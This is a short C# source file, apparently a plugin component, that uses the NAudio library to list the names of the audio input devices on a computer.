using NAudio.Wave;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class GetDevices
    {
        internal static List<string> GetAudioDevices()
        {
            List<string> devices = new List<string>();

            for (int i = 0; i < WaveIn.DeviceCount; i++)
            {
                WaveInCapabilities deviceInfo = WaveIn.GetCapabilities(i);
                devices.Add(deviceInfo.ProductName);
            }
            return devices;
        }
    }
}
